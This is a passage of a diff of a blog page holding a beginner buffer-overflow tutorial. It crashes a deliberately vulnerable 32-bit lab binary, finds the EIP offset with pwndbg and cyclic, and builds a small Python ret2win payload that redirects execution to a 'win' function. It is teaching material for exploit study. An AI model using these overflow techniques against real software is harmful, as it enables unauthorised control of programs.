+<li><code>PIE - No PIE (0x8048000)</code> - PIE (Position Independent Executable) allows a binary to be loaded at random memory addresses, enhancing security against certain attacks. The lack of PIE means the binary is loaded at a fixed address, making it easier to predict and exploit.</li>
+<li><code>Stack</code> - Executable - This indicates that the stack is marked as executable, which poses a major security risk. Attackers can execute arbitrary code placed on the stack, leading to potential exploits.</li>
+<li>RWX: Has RWX segments - RWX (Read-Write-Execute) segments are sections of memory that can be read, written, and executed. This is a bad practice, as it allows for code injection attacks. The presence of RWX segments indicates serious security vulnerabilities.</li>
+<li><code>Stripped: No</code> - This indicates that the binary contains its symbol information, making it easier to debug and analyze. While this is beneficial for development, it can also aid attackers in crafting exploits.</li>
+</ul>
+<p>I understand that these security mitigations can be challenging to grasp, but bear with me—we&rsquo;ll take it step by step. For now, just remember that we&rsquo;ve disabled all security checks, allowing us to focus on the fundamentals of a vanilla buffer overflow.</p>
+<h3 id="crashing-the-program">Crashing the Program</h3>
+<p>When we run the program, we notice that it accepts input as expected:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./vuln 
+</span></span><span style="display:flex;"><span>Enter some text:
+</span></span><span style="display:flex;"><span>AAAAAAA
+</span></span><span style="display:flex;"><span>Try Again!
+</span></span></code></pre></div><p>Everything seems normal, but what happens if we provide a larger input, like 100 A&rsquo;s? Sounds interesting—let&rsquo;s give it a shot! :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./vuln 
+</span></span><span style="display:flex;"><span>Enter some text:
+</span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>Segmentation fault
+</span></span></code></pre></div><p>So, what is this &ldquo;Segmentation fault&rdquo;?
+A <strong>Segmentation fault</strong> occurs when a program tries to access a memory segment that it&rsquo;s not allowed to. This typically happens due to issues like buffer overflows, where the program writes more data to a buffer than it can hold. In our case, by inputting a string that&rsquo;s too long, we’ve overwritten memory that the program shouldn&rsquo;t touch, leading to the abrupt termination of the program.</p>
+<p>But how does writing more data lead to accessing restricted memory segments? Let’s take a closer look.</p>
+<h3 id="generating-and-analyzing-core-dumps">Generating and Analyzing Core Dumps</h3>
+<p>Earlier, we discussed the different types of ELF files, including the <code>CORE</code> ELF file, which is created when a process crashes. Let’s enable core dump generation and crash our program to see this in action.</p>
+<p>First, we need to set the limit for core file size to unlimited:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ulimit -c unlimited
+</span></span></code></pre></div><p>Next, we run our vulnerable program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./vuln 
+</span></span><span style="display:flex;"><span>Enter some text:
+</span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>After crashing the program, we can see that a core file has been generated, typically named <code>core</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file core 
+</span></span><span style="display:flex;"><span>core: ELF 32-bit LSB core file, Intel 80386, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, SVR4-style, from <span style="color:#e6db74">&#39;./vuln&#39;</span>, real uid: 1000, effective uid: 1000, real gid: 1000, effective gid: 1000, execfn: <span style="color:#e6db74">&#39;./vuln&#39;</span>, platform: <span style="color:#e6db74">&#39;i686&#39;</span>
+</span></span></code></pre></div><p>Let’s examine the core dump using GDB.</p>
+<p><strong>Install pwndbg</strong></p>
+<p>To install pwndbg, simply follow these steps:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/pwndbg/pwndbg
+</span></span><span style="display:flex;"><span>$ cd pwndbg
+</span></span><span style="display:flex;"><span>$ ./setup.sh
+</span></span></code></pre></div><p>Load the core dump in gdb:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb --quiet -core core 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>New LWP 17510<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Core was generated by <span style="color:#e6db74">`</span>./vuln<span style="color:#e6db74">&#39;.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Program terminated with signal SIGSEGV, Segmentation fault.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#0  0x41414141 in ?? ()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">------- tip of the day (disable with set show-tips off) -------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Pwndbg resolves kernel memory maps by parsing page tables (default) or via monitor info mem QEMU gdbstub command (use set kernel-vmmap-via-page-tables off for that)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">──────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EAX  0xff93b8f0 ◂— &#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EBX  0x41414141 (&#39;</span>AAAA<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ECX  0xf7ebf8ac ◂— 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EDX  0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EDI  0xf7f25b60 ◂— 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ESI  0xff93ba1c —▸ 0xff93d8e4 ◂— &#39;</span>SHELL<span style="color:#f92672">=</span>/usr/bin/bash<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EBP  0x41414141 (&#39;</span>AAAA<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ESP  0xff93b940 ◂— &#39;</span>AAAAAAAAAAAAAAAAAAAA<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EIP  0x41414141 (&#39;</span>AAAA<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Invalid address 0x41414141
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">────────────────────────────────────────[ STACK ]─────────────────────────────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00:0000│ esp 0xff93b940 ◂— &#39;</span>AAAAAAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>... ↓        <span style="color:#ae81ff">4</span> skipped
+</span></span><span style="display:flex;"><span>05:0014│     0xff93b954 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>06:0018│     0xff93b958 —▸ 0xf7cc6069 ◂— add ebx, 0x1f7dab
+</span></span><span style="display:flex;"><span>07:001c│     0xff93b95c —▸ 0xf7cacd43 ◂— add esp, 0x10
+</span></span><span style="display:flex;"><span>──────────────────────────────────────<span style="color:#f92672">[</span> BACKTRACE <span style="color:#f92672">]</span>───────────────────────────────────────
+</span></span><span style="display:flex;"><span> ► <span style="color:#ae81ff">0</span> 0x41414141 None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span> 0x41414141 None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span> 0x41414141 None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span> 0x41414141 None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span> 0x41414141 None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span> 0x41414141 None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>      0x0 None
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></div><p>We can see that EIP register contains 0x41414141 which is AAAA in hex. The EIP register points to next instruction to be executed. You can refer x86 Assembly Series. Due to supplying multiple A&rsquo;s into the program buffer, they oveflowed the stack and ended up in the EIP register. Refer to the <a href="#how-the-stack-operates">Stack Working</a> section.</p>
+<p>Now that we understand how to overwrite the return address, the next question is: how do we determine how many &lsquo;A&rsquo;s are actually overwriting it? To tackle this, we can generate a unique 4-byte pattern. This pattern will help us identify the exact offset needed to reach the return address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ pwn cyclic <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+</span></span></code></pre></div><p>Next, copy this unique pattern and use it as input for the vulnerable binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./vuln 
+</span></span><span style="display:flex;"><span>Enter some text:
+</span></span><span style="display:flex;"><span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Now, let&rsquo;s analyze the generated core dump:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb -core core 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span> ESP  0xff949430 ◂— <span style="color:#e6db74">&#39;uaaavaaawaaaxaaayaaa&#39;</span>
+</span></span><span style="display:flex;"><span> EIP  0x61616174 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;taaa&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>────────────────────────────
+</span></span><span style="display:flex;"><span>Invalid address 0x61616174
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>From this analysis, we see that <code>0x61616174</code> (which corresponds to &rsquo;taaa&rsquo;) has overwritten the return address.</p>
+<p>To find the offset where this occurs, we can use the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cyclic -l 0x61616174
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>
+</span></span></code></pre></div><p>This tells us that the offset required to overwrite the return address is 76 bytes, which ultimately affects the EIP register.</p>
+<p>Let&rsquo;s generate a exploit in Python and save it as <code>exploit.py</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">76</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset 
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;BBBB&#34;</span> <span style="color:#75715e"># EIP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><p>Now, use this exploit to verify our results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./exploit.py  | ./vuln 
+</span></span><span style="display:flex;"><span>Enter some text:
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ gdb -core core
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span> ESP  0xffc95890 —▸ 0xffc95800 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> EIP  0x42424242 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;BBBB&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>────────────────────────────
+</span></span><span style="display:flex;"><span>Invalid address 0x42424242
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>As we can see, we&rsquo;ve successfully taken control of the EIP register! 🎉 Now we can point it anywhere else, opening up exciting possibilities for exploitation! 🚀</p>
+<p>What if we point to the <code>win</code> function we have in our <code>vuln.c</code>? First, let&rsquo;s get the address of the <code>win</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nm vuln | grep win
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08049186</span> T win
+</span></span></code></pre></div><p>So, the address of the <code>win</code> function is <code>0x08049186</code>. Now, let&rsquo;s modify our exploit to use this address in hexadecimal byte format:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">76</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#payload += &#34;BBBB&#34; # EIP</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08\x04\x91\x86</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><p>However, when we run the exploit, we see that it failed. 😢</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./exploit.py | ./vuln 
+</span></span><span style="display:flex;"><span>Enter some text:
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Let&rsquo;s check the core dump:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb -core core 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span> ESI  0xfffbe16c —▸ 0xfffbe8e4 ◂— <span style="color:#e6db74">&#39;SHELL=/usr/bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span> EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ESP  0xfffbe090 —▸ 0xfffbe000 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> EIP  0x86910408
+</span></span><span style="display:flex;"><span>────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>────────────────────────────
+</span></span><span style="display:flex;"><span>Invalid address 0x86910408
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Here, we see that EIP contains the address 0x86910408, which is the reverse of our original address 0x08049186. The reason for this is that x86 architecture uses Little Endian format. This means that when a multi-byte value is stored, the least significant byte is placed at the lowest memory address.</p>
+<p>To correctly overwrite the EIP with the address of the win function, we need to reverse the byte order in our payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">76</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload += &#34;BBBB&#34;  # EIP</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload += &#34;\x08\x04\x91\x86&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x86\x91\x04\x08</span><span style="color:#e6db74">&#34;</span>  <span style="color:#75715e"># Correct byte order for EIP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><p>With this final adjustment, we should be able to redirect the flow of execution right to our win function. Now, fingers crossed—let’s run the exploit and see if we land in the win function!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./exploit.py | ./vuln 
+</span></span><span style="display:flex;"><span>Enter some text:
+</span></span><span style="display:flex;"><span>You<span style="color:#960050;background-color:#1e0010">&#39;</span>ve reached the win <span style="color:#66d9ef">function</span>! 🎉
+</span></span></code></pre></div><p>Voilà! 🎊 We’ve successfully redirected the program’s execution to the <code>win</code> function! Often, developers include these testing or debugging functions during development and forget to remove or disable them later. These so-called “dead code” functions can become vulnerabilities, as attackers can exploit them to gain unintended control over program flow. In CTFs, this technique is often referred to as <code>ret2win</code>.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In this part, we explored basic binary analysis and learned how to control EIP to redirect execution flow to unintended functions. In the next section, we’ll dive into exploitation techniques for binaries without &ldquo;win&rdquo; functions and ways to bypass common security mitigations.</p>
 <hr>
-<h2 id="references">References</h2>
-<h3 id="books">Books</h3>
+<h3 id="references">References</h3>
+<p><strong>Books</strong></p>
 <ul>
 <li><a href="https://www.packtpub.com/product/learning-linux-binary-analysis/9781782167105">Learning Linux Binary Analysis</a></li>
 </ul>
-<h3 id="articles">Articles</h3>
+<p><strong>Articles</strong></p>
 <ul>
 <li><a href="https://opensource.com/article/20/4/linux-binary-analysis">https://opensource.com/article/20/4/linux-binary-analysis</a></li>
 </ul>
 
     </div>
 </div>
+</main>
+      </div>
 
-            </main>
-        </div>
-
-
-        <footer class="footer">
+      <footer class="footer">
     
         <span>
             © 2024 KernW0lf, Built with
@@ -510,7 +981,5 @@ Apply numeric sort on the addresses:</li>
     
 </footer>
     </div>
-
-</body>
-
+  </body>
 </html>
